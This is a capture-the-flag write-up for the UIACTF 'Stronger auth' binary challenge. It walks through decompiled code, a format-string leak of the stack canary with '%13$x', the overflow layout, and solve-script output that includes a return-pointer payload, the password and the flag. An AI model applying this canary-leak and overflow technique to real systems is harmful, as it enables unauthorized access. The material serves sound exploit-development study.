# Stronger auth!

Defences have been hardened, bet you can't get access now!

`nc stronger-auth.chall.uiactf.no 1337`

[⬇️ chal](./chal)

# Writeup

Opened the code in Ghidra I see the code is pretty simple. There is a `FLAG` function that is never called. I also see that I need to authenticate with a password which is seemingly random. [chal.c](./chal.c) is the source code extracted from [Dogbolt](https://dogbolt.org/?id=adc71fff-5212-41cd-b42f-bb575a2d3c85) 

```c
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  undefined8 password;
  undefined8 filler1;
  undefined4 filler2;
  undefined8 username;
  undefined8 filler3;
  undefined4 filler4;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  password = 0;
  filler1 = 0;
  filler2 = 0;
  username = 0;
  filler3 = 0;
  filler4 = 0;
  puts(
      "This system is for authorized use only. Unauthorized access will result in immediate disconne ction!"
      );
  printf("Username: ");
  fgets((char *)&username,0x14,stdin);
  putchar(10);
  fflush(stdout);
  sVar2 = strcspn((char *)&username,"\n");
  *(undefined *)((long)&username + sVar2) = 0;
  printf((char *)&username);
  printf("@coolbox\'s password: ");
  fgets((char *)&password,200,stdin);
  putchar(10);
  iVar1 = strncmp((char *)&username,"admin",5);
  if (iVar1 == 0) {
    iVar1 = memcmp(admin_password,&password,0x14);
    if (iVar1 == 0) {
      authorized = 1;
      goto LAB_00401691;
    }
  }
  printf("DISCONNECTED!");
LAB_00401691:
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The username has FMT vulnerability. The password has a buffer overflow vulnerability. But whenever I try to overflow I get a message:

```
DISCONNECTED!*** stack smashing detected ***: terminated
```

That `DISCONNECTED` shows me that I've not even able to guess the password. The second one is to stop me from overwriting the return address to a new function.. So learning how to bypass the stack smashing detection I got a script [fuzzStack.py](./fuzzStack.py) that I can use to figure out how to leak the canary value which I can then insert when I overflow the buffer so they do not see that I've tampered with the stack. 

After running the script a few times I found a website which told me the canary value often was random ending with double `0`. 

    The last value there is the canary. We can tell because it's roughly 64 bytes after the "buffer start", which should be close to the end of the buffer. Additionally, it ends in 00 and looks very random, unlike the libc and stack addresses that start with f7 and ff. If we count the number of address it's around 24 until that value, so we go one before and one after as well to make sure. [- Source](https://ir0nstone.gitbook.io/notes/types/stack/canaries)

Quickly it looks like the canary seems to be in position 13 of the stack so using `%13$x` I can leak the canary. I now made a python script to do all the heavy lifting.

It will run the binary, leak the canary, then overwrite the stack until the canary, insert the canary and overwrite until the `Return Instruction Pointer`. Then we can call any functions we cant. 

See [solve.py](./solve.py) for the full script. 

The stack seems to be from the password:

```
56 bytes - filler
8 bytes - canary
8 bytes - filler
8 bytes - RIP
```

So when I run the script this happens:

```bash
$ python3 solve.py REMOTE
Using remote
canary found: 57fde15eb7096100
sending payload: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141006109b75ee1fd57424242424242424294144000000000000041400000000000641140000000000037154000000000009614400000000000
password found: 6WD1a0sKS_ geT{,JiH`+
flag found?: UIACTF{No password is strong if you can leak it!}
```